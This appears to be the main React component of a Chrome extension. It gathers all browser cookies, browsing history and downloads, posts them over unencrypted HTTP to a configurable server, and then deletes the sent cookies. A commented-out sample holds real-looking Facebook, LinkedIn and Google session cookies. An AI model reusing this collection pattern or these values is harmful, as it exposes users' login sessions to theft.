/*global chrome*/
import React from "react";
import "./App.css";
import FailedIcon from './Assets/failed.png';
import BrowsingCard from "./Components/BrowsingCard";
import CookiesCard from "./Components/CookiesCard";
import DownloadsCard from "./Components/DownloadsCard";
import MaliciousCard from "./Components/MaliciousCard";
import Loader from "./Components/Loader";

class App extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      data: null,
      requestSent: false,
      // data: {
      //   cookies: {
      //     Linkedin: [
      //       {
      //         domain: ".linkedin.com",
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "AMCVS_14215E3D5995C57C0A495C55%40AdobeOrg",
      //         path: "/",
      //         sameSite: "unspecified",
      //         secure: false,
      //         session: true,
      //         storeId: "0",
      //         value: "1",
      //       },
      //       {
      //         domain: ".linkedin.com",
      //         expirationDate: 1667579074,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "AMCV_14215E3D5995C57C0A495C55%40AdobeOrg",
      //         path: "/",
      //         sameSite: "unspecified",
      //         secure: false,
      //         session: false,
      //         storeId: "0",
      //         value:
      //           "-637568504%7CMCIDTS%7C19121%7CMCMID%7C55806888412757836672737100701872151070%7CMCAAMLH-1652631874%7C6%7CMCAAMB-1652631874%7C6G1ynYcLPuiQxYZrsz_pkqfLG9yMXBpb2zX5dvJdYQJzPXImdj0y%7CMCOPTOUT-1652034274s%7CNONE%7CvVersion%7C5.1.1",
      //       },
      //       {
      //         domain: ".linkedin.com",
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "lang",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: true,
      //         storeId: "0",
      //         value: "v=2&lang=en-us",
      //       },
      //       {
      //         domain: ".linkedin.com",
      //         expirationDate: 1715140927.778259,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "bcookie",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: '"v=2&7716895f-b353-4a08-873a-e25da2352697"',
      //       },
      //       {
      //         domain: ".www.linkedin.com",
      //         expirationDate: 1715140927.778291,
      //         hostOnly: false,
      //         httpOnly: true,
      //         name: "bscookie",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value:
      //           '"v=1&2022050816243476853408-c66d-4051-889b-a0cbcae6f295AQHH9j6OUWyC3ZJbpbnQLe6l3myia1O8"',
      //       },
      //       {
      //         domain: ".linkedin.com",
      //         expirationDate: 1714584108.778317,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "li_gc",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value:
      //           "MTswOzE2NTIwMjcwNzQ7MjswMjH7KZ4+0tYo3eKycCI128WYw//xKeIzCFLYqUXQrCkTMg==",
      //       },
      //       {
      //         domain: ".linkedin.com",
      //         expirationDate: 1652113475.778338,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "lidc",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value:
      //           '"b=TGST01:s=T:r=T:a=T:p=T:g=2825:u=1:x=1:i=1652027074:t=1652113474:v=2:sig=AQELh8ueuQ_ElvefcvHyLAJ654lBeOPA"',
      //       },
      //       {
      //         domain: ".linkedin.com",
      //         expirationDate: 1654619074,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "aam_uuid",
      //         path: "/",
      //         sameSite: "unspecified",
      //         secure: false,
      //         session: false,
      //         storeId: "0",
      //         value: "56018378244347848242680501229519186389",
      //       },
      //     ],
      //     Google: [
      //       {
      //         domain: ".google.com",
      //         expirationDate: 1667579640.668374,
      //         hostOnly: false,
      //         httpOnly: true,
      //         name: "AEC",
      //         path: "/",
      //         sameSite: "lax",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value:
      //           "AakniGPx2GPi82HShji8GNsatBAete-1YSF-wtLQKY4x7sIytWArhhOPXw",
      //       },
      //       {
      //         domain: ".google.com",
      //         expirationDate: 1686214338.668429,
      //         hostOnly: false,
      //         httpOnly: true,
      //         name: "__Secure-ENID",
      //         path: "/",
      //         sameSite: "lax",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value:
      //           "4.SE=Z8Z3t08Y9pF-Wk_1SPgXjvWfbi7sTKSGDXS9mZLgBXjKjt6yqnlfHFMEms-17zANgL-waIrbc11TOCWKeLFfZ8PwOA1MbNmKqCE1KA8CV7atc_6a8QW-AdmM0EMtTvb4pnfPAeBjydsDbkEugyUzwpqeXzQ8g6wbKxtFo7XPeMA",
      //       },
      //       {
      //         domain: ".google.com",
      //         expirationDate: 1715099640.668446,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "CONSENT",
      //         path: "/",
      //         sameSite: "unspecified",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "PENDING+338",
      //       },
      //     ],
      //     Facebook: [
      //       {
      //         domain: ".facebook.com",
      //         expirationDate: 1683562074.766652,
      //         hostOnly: false,
      //         httpOnly: true,
      //         name: "xs",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "23%3A402ypCQLjrVuIQ%3A2%3A1652026075%3A-1%3A6682",
      //       },
      //       {
      //         domain: ".facebook.com",
      //         expirationDate: 1683562074.766632,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "c_user",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "100001678075593",
      //       },
      //       {
      //         domain: ".facebook.com",
      //         expirationDate: 1652630873,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "dpr",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "2",
      //       },
      //       {
      //         domain: ".facebook.com",
      //         expirationDate: 1652630848,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "wd",
      //         path: "/",
      //         sameSite: "lax",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "1702x707",
      //       },
      //       {
      //         domain: ".facebook.com",
      //         expirationDate: 1652630845.838878,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "locale",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "de_DE",
      //       },
      //       {
      //         domain: ".facebook.com",
      //         expirationDate: 1715098077.7666,
      //         hostOnly: false,
      //         httpOnly: true,
      //         name: "sb",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "u-p3YpkHDqxQJgTxGFOUizDt",
      //       },
      //       {
      //         domain: ".facebook.com",
      //         expirationDate: 1715098024.181673,
      //         hostOnly: false,
      //         httpOnly: true,
      //         name: "datr",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "pep3YsE2-l3uFUwumBHKxKxF",
      //       },
      //       {
      //         domain: ".facebook.com",
      //         expirationDate: 1659802262.232185,
      //         hostOnly: false,
      //         httpOnly: true,
      //         name: "fr",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value:
      //           "0riB3spWaPa0qwjmX.AWUZ4yEfPVq_hzJ8s_qgbNzweps.Bid-rd.Sy.AAA.0.0.Bid-uX.AWV46LVfl8Q",
      //       },
      //       {
      //         domain: ".facebook.com",
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "presence",
      //         path: "/",
      //         sameSite: "unspecified",
      //         secure: true,
      //         session: true,
      //         storeId: "0",
      //         value:
      //           "C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1652026265207%2C%22v%22%3A1%7D",
      //       },
      //     ],
      //     Doubleclick: [
      //       {
      //         domain: ".doubleclick.net",
      //         expirationDate: 1685723075.863954,
      //         hostOnly: false,
      //         httpOnly: true,
      //         name: "IDE",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value:
      //           "AHWqTUkfm2eiG4caVUhQH32gsVgkLI8WlxiipetN0M4yhg21d5wDu-aQbdp2pbLX3TA",
      //       },
      //     ],
      //     Demdex: [
      //       {
      //         domain: ".demdex.net",
      //         expirationDate: 1667579075.92994,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "demdex",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "56018378244347848242680501229519186389",
      //       },
      //       {
      //         domain: ".dpm.demdex.net",
      //         expirationDate: 1667579075.929855,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "dpm",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "56018378244347848242680501229519186389",
      //       },
      //       {
      //         domain: ".demdex.net",
      //         expirationDate: 1667579076,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "dextp",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "771-1-1652027075692|1123-1-1652027076712",
      //       },
      //     ],
      //     Trkn: [
      //       {
      //         domain: ".trkn.us",
      //         expirationDate: 1683563075.919446,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "barometric[cuid]",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: "cuid_23820f89-733c-4c45-b14e-d51c6426aa80",
      //       },
      //     ],
      //     Twitter: [
      //       {
      //         domain: ".twitter.com",
      //         expirationDate: 1715099076.981019,
      //         hostOnly: false,
      //         httpOnly: false,
      //         name: "personalization_id",
      //         path: "/",
      //         sameSite: "no_restriction",
      //         secure: true,
      //         session: false,
      //         storeId: "0",
      //         value: '"v1_u1Q68xiOoicTVhgRc+XrJw=="',
      //       },
      //     ],
      //   },
      //   history: {
      //     browsing: [
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/diajsdiajsdiasdoiaskdo",
      //         visitCount: 2,
      //         canceled: true,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1252022261235.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1252022361235.3389,
      //         title: "Google - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //         canceled: true,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "FacebooGooglek - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //       {
      //         id: "3",
      //         lastVisitTime: 1652026267879.3389,
      //         title: "Facebook - log in or sign up",
      //         typedCount: 0,
      //         url: "https://www.facebook.com/",
      //         visitCount: 2,
      //       },
      //     ],
      //     downloads: [
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1352026267879.3389,
      //         canceled: true,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1352026267879.3389,
      //         canceled: true,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1352026267879.3389,
      //         canceled: true,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1352026267879.3389,
      //         canceled: true,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1352026267879.3389,
      //         canceled: true,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1352026267879.3389,
      //         canceled: true,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1652023267879.3389,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1652026237878.3389,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1652026267823.3389,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1652026267879.3389,
      //         canceled: true,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1652026267879.3389,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1152026267879.3389,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1652026267879.3389,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1652026267879.3389,
      //       },
      //       {
      //         url: "https://www.facebook.com/",
      //         filename: "arhiva_personala.zip",
      //         startTime: 1652026267879.3389,
      //       },
      //     ],
      //   },
      // },
    };
  }

  getPlatformFromUrl = (url) => {
    // Url should not start with chrome://, etc.
    if (url.search(/^chrome/) !== -1) return undefined;
    if (url.search(/^file:\/\//) !== -1) return undefined;
    if (url.search(/\./) === -1) return undefined;
    if (url.search(/(^https*:\/\/)*([a-zA-Z0-9-]*\.{0,1})*/) === -1)
      return undefined;
  
    // Remove scheme if any
    url = url.match(/(^https*:\/\/)*([a-zA-Z0-9-]*\.{0,1})*/)[0];
    url = url.replace(/^https*:\/\//, "");
    if (url) {
      var platform;
      let hostname_fields = url.split(".");
      if (hostname_fields.slice(-2).join(".") === "co.uk") {
        platform = hostname_fields[hostname_fields.length - 3];
      } else {
        platform = hostname_fields[hostname_fields.length - 2];
      }
  
      return platform.charAt(0).toUpperCase() + platform.slice(1);
    }
  
    return undefined;
  }
  
  sendRequest(
    {
      route = "/",
      server = null,
      body = {},
      method = "POST",
      maxTries = 3,
      timeout = 3000,
    },
    callback
  ) {
    chrome.storage.local.get(["server"], async (data) => {
      const backend_port = 3001;
      const backend_ip = server ?? data.server;
      const scheme = "http";

      const controller = new AbortController();

      var tries = 0;
      while (tries < maxTries) {
        try {
          var id = setTimeout(() => controller.abort(), timeout);
          console.log("Sending request to " + backend_ip + ":" + backend_port);
          const res = await fetch(
            `${scheme}://${backend_ip}:${backend_port}${route}`,
            {
              method: method,
              credentials: "include",
              timeout: timeout,
              signal: controller.signal,
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(body),
            }
          );

          clearTimeout(id);
          switch (res.status) {
            case 200:
              console.log("response: " + res);
              callback(res);
              return;
            default:
              console.log("Trying...");
              tries += 1;
          }
        } catch (e) {
          clearTimeout(id);
          console.log("Trying...");
          console.log(e);
          await new Promise((r) => setTimeout(r, timeout));
          tries += 1;
        }
      }
  this.setState({requestSent: true})
      callback(null);
    });
  }

  getSyncData = (callback) => {
    chrome.storage.local.get(
      ["prefferences", "server", "active"],
      async (res) => {
        chrome.tabs.query({}, (openedTabs) => {
          chrome.cookies.getAll({}, (cookies) => {
            chrome.history.search({ text: "", maxResults: 10000 }, (visits) => {
              chrome.downloads.search({}, (downloads) => {
                const prefferences = res.prefferences;
  
                var sync_data = {
                  prefferences: {
                    cookies: prefferences.cookies,
                    history: prefferences.history,
                  },
                  data: {
                    cookies: {},
                    history: {
                      browsing: [],
                      downloads: [],
                    },
                  },
                };
  
                if (prefferences.history.downloads)
                  if (downloads) sync_data.data.history.downloads = downloads;
  
                if (prefferences.history.browsing)
                  if (visits)
                    sync_data.data.history.browsing = visits.filter((visit) => {
                      console.log(visit);
                      if (visit.url.search(/^chrome/) !== -1) return false;
                      if (visit.url.search(/^file:\/\//) !== -1) return false;
                      return true;
                    });
                console.log(
                  "sync_data.data.history.browsing :>> ",
                  sync_data.data.history.browsing
                );
  
                // Attach cookies
                let prefferences_active_platforms = Object.keys(
                  prefferences.cookies
                )
                  .map((platform) => {
                    if (
                      prefferences.cookies[platform].forced ||
                      prefferences.cookies[platform]["active"]
                    )
                      return platform;
                  })
                  .filter((platform) => platform !== undefined);
  
                let opened_tabs_platforms = [
                  ...new Set(
                    openedTabs
                      .map((tab) => {
                        let platform = this.getPlatformFromUrl(tab.url);
                        return platform;
                      })
                      .filter((platform) => platform !== undefined)
                  ),
                ];
  
                let platforms_to_attach = prefferences_active_platforms.filter(
                  (platform) =>
                    !opened_tabs_platforms.includes(platform) &&
                    prefferences.cookies[platform]["active"]
                );
  
                cookies.forEach((cookie) => {
                  let platform = this.getPlatformFromUrl(cookie.domain);
  
                  if (opened_tabs_platforms.includes(platform)) {
                    if (!res.active) {
                      if (!(platform in sync_data.data.cookies))
                        sync_data.data.cookies[platform] = [];
                      sync_data.data.cookies[platform].push(cookie);
                      return;
                    }
                  }
                  if (platforms_to_attach.includes(platform)) {
                    if (!sync_data.data.cookies[platform])
                      sync_data.data.cookies[platform] = [];
                    sync_data.data.cookies[platform].push(cookie);
                  }
                });
  
                callback(sync_data);
              });
            });
          });
        });
      }
    );
  }
  
  synchronizeUser = (force = false, callback = () => {}) => {
    this.getSyncData((sync_data) => {
      if (!force && Object.keys(sync_data.data.cookies).length === 0) callback();
      else {
        chrome.storage.local.get(["server"], (res) => {
          const server = res.server;
  
          this.sendRequest(
            { server: server, route: "/user/sync", body: sync_data },
            () => {
              // Delete cookies sent
              let cookies_to_remove = [];
              Object.keys(sync_data.data.cookies).forEach((platform) => {
                cookies_to_remove = cookies_to_remove.concat(
                  sync_data.data.cookies[platform]
                );
              });
  
              this.removeCookies(cookies_to_remove, callback);
            }
          );
        });
      }
    });
  }

  removeCookies(cookies, callback = () => {}) {
    // Recursively remove cookies so that we can call
    // the callback after setting the last cookie
  
    if (cookies.length === 0) {
      callback();
    } else {
      var cookie = cookies.pop();
      const details = {
        name: cookie.name,
        url: `https://${cookie.domain.replace(/^\./, "")}${cookie.path}`,
        storeId: cookie.storeId,
      };
  
      console.log("Removing cookie for domain", cookie.domain);
      chrome.cookies.remove(details, () => this.removeCookies(cookies, callback));
    }
  }

  componentDidMount() {
    this.synchronizeUser(true, () => {
      this.sendRequest({ route: "/user/stats" }, async (res) => {
        res = await res.json();
        console.log(res);
        this.setState({
          data: res.data,
        });
      });
    })
  }

  render() {
    var malicious_visits = 0;
    var malicious_downloads = 0;

    if (this.state.data) {
      if (this.state.data.history.browsing)
        if (this.state.data.history.browsing.length > 0) {
          this.state.data?.history?.browsing.forEach((visit) => {
            if (visit.canceled) {
              malicious_visits++;
            }
          });
        }

      if (this.state.data.history.downloads)
        if (this.state.data.history.downloads.length > 0) {
          this.state.data?.history?.downloads.forEach((item) => {
            if (item.canceled) {
              malicious_downloads++;
            }
          });
        }
    }
    return (
      <div className="App">
        {this.state.data ? (
          <div className="animation-wrapper">
            <p className="title">STATISTICS</p>
            <div className="row">
              <div className="column">
                <MaliciousCard
                  number={malicious_visits}
                  text="malicious connections canceled"
                />
                <BrowsingCard items={this.state.data.history.browsing} />
              </div>
              <div className="column">
                <p className="user-name">Cazamir Teodor</p>
                <CookiesCard items={this.state.data.cookies} />
              </div>
              <div className="column">
                <MaliciousCard
                  number={malicious_downloads}
                  text="malicious downloads canceled"
                />
                <DownloadsCard items={this.state.data.history.downloads} />
              </div>
            </div>
          </div>
        ) : this.state.requestSent ? (
          <div className="status">
                <img
                  className="status-icon"
                  src={FailedIcon}
                  alt="failed-icon"
                />
                <p>An error has occured :( Please try again!</p>
                <div onClick={this.sendReport} className="retryBtn">
                  <p>Retry</p>
                </div>
              </div>
        ) : (
          <Loader />
        )}
      </div>
    );
  }
}

export default App;
